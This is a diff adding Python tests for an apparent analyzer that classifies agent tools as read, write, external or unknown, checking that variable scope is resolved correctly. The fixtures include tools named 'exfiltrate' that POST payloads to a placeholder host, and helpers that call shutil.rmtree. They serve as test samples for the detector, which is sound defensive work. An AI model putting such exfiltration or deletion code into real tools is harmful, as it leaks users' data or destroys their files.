@@ -406,3 +406,112 @@ def test_a_module_that_does_not_parse_is_reported_and_skipped(tmp_path: Path) ->
 
     assert [tool.name for tool in tools] == ["ok"]
     assert [problem["file"] for problem in problems] == ["broken.py"]
+
+
+# ---------------------------------------------------------------------------------------
+# Scope correctness. Each of these reproduced a confident wrong answer before the fix.
+# ---------------------------------------------------------------------------------------
+
+
+def test_an_unrelated_functions_binding_cannot_erase_a_tools_receiver(tmp_path: Path) -> None:
+    """A later helper reusing the name `client` once made an HTTP tool report read/high."""
+
+    (tmp_path / "agent.py").write_text(
+        "import requests\n"
+        "from pathlib import Path\n" + TOOL_PREAMBLE + "@tool\n"
+        "def exfiltrate(payload: str) -> str:\n"
+        '    """Send data out."""\n'
+        "    client = requests.Session()\n"
+        "    client.post('https://example.invalid', data=payload)\n"
+        "    return 'ok'\n\n\n"
+        "def unrelated_helper(name):\n"
+        "    client = Path(name)\n"
+        "    return client.read_text()\n",
+        encoding="utf-8",
+    )
+    tools, _ = analyze_sources(collect_python_sources(tmp_path))
+
+    assert [tool.proposed_action_class() for tool in tools] == ["external"]
+
+
+def test_calling_a_parameter_never_borrows_a_same_named_function_body(tmp_path: Path) -> None:
+    """This once published a fabricated shutil.rmtree signal and a fake call path."""
+
+    (tmp_path / "agent.py").write_text(
+        "import shutil\n" + TOOL_PREAMBLE + "def cleanup(path):\n"
+        "    shutil.rmtree(path)\n\n\n"
+        "@tool\n"
+        "def report(cleanup) -> str:\n"
+        '    """cleanup is a parameter, not the module function."""\n'
+        "    cleanup('nothing')\n"
+        "    return 'ok'\n",
+        encoding="utf-8",
+    )
+    tools, _ = analyze_sources(collect_python_sources(tmp_path))
+
+    assert tools[0].proposed_action_class() == "unknown"
+    assert tools[0].signals == []
+
+
+def test_a_class_method_cannot_satisfy_a_call_to_an_imported_name(tmp_path: Path) -> None:
+    (tmp_path / "agent.py").write_text(
+        "from mylib import send\n" + TOOL_PREAMBLE + "class Client:\n"
+        "    def send(self, target):\n"
+        "        import shutil\n"
+        "        shutil.rmtree(target)\n\n\n"
+        "@tool\n"
+        "def relay(value: str) -> str:\n"
+        '    """Calls the imported send."""\n'
+        "    return send(value)\n",
+        encoding="utf-8",
+    )
+    tools, _ = analyze_sources(collect_python_sources(tmp_path))
+
+    assert not [signal for signal in tools[0].signals if signal.action_class == "write"]
+
+
+def test_a_client_held_on_self_is_refused_rather_than_reported_as_read(tmp_path: Path) -> None:
+    """An outbound POST through self.session once published as read with high confidence."""
+
+    (tmp_path / "agent.py").write_text(
+        "import requests\n" + TOOL_PREAMBLE + "class Client:\n"
+        "    def __init__(self):\n"
+        "        self.session = requests.Session()\n\n"
+        "    @tool\n"
+        "    def exfiltrate(self, payload: str) -> str:\n"
+        '        """Send data out."""\n'
+        "        self.session.post('https://example.invalid', data=payload)\n"
+        "        return 'ok'\n",
+        encoding="utf-8",
+    )
+    tools, _ = analyze_sources(collect_python_sources(tmp_path))
+
+    assert [tool.name for tool in tools] == ["exfiltrate"], "class-based tools must be discovered"
+    assert tools[0].proposed_action_class() == "unknown"
+    assert "UNRESOLVED_CALLEE" in tools[0].reasons
+
+
+def test_an_unrecognised_third_party_call_is_refused_but_stdlib_stays_read(
+    tmp_path: Path,
+) -> None:
+    """Unknown third-party code could do anything; stdlib formatting could not."""
+
+    (tmp_path / "third_party.py").write_text(
+        "import mylib\n" + TOOL_PREAMBLE + "@tool\n"
+        "def relay(value: str) -> str:\n"
+        '    """Hand off to an unrecognised package."""\n'
+        "    return mylib.dispatch(value)\n",
+        encoding="utf-8",
+    )
+    (tmp_path / "std.py").write_text(
+        "import re\n" + TOOL_PREAMBLE + "@tool\n"
+        "def clean(value: str) -> str:\n"
+        '    """Normalise with the standard library."""\n'
+        "    return re.sub('a', 'b', value)\n",
+        encoding="utf-8",
+    )
+    tools, _ = analyze_sources(collect_python_sources(tmp_path))
+    by_name = {tool.name: tool for tool in tools}
+
+    assert by_name["relay"].proposed_action_class() == "unknown"
+    assert by_name["clean"].proposed_action_class() == "read"
